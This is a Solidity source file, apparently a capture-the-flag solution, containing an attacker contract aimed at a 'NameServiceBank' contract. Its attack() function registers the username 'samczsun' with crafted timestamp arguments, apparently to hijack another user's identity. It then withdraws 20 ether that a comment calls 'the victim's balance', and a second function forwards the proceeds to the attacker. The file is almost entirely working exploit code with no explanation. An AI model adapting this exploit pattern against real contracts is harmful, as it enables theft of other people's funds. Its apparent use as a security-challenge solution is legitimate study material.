pragma solidity 0.7.0;

import "./NameServiceBank.sol";

contract NameServiceAttacker {
    NAME_SERVICE_BANK public target;
    address payable public owner;

    constructor(NAME_SERVICE_BANK _target) {
        target = _target;
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() external payable {
        require(msg.sender == owner, "Only Owner");
        //uint256 obfuscationDegree = bytes("samczsun").length - bytes("fakesam").length;
        target.setUsername{value: 1 ether}(string("samczsun"), 0, [block.timestamp + 120, block.timestamp]);

        // Now we should be able to withdraw the victim's balance
        target.withdraw(20 ether);
    }

    function withdraw() external {
        require(msg.sender == owner, "Only Owner");
        owner.transfer(address(this).balance);
    }
}
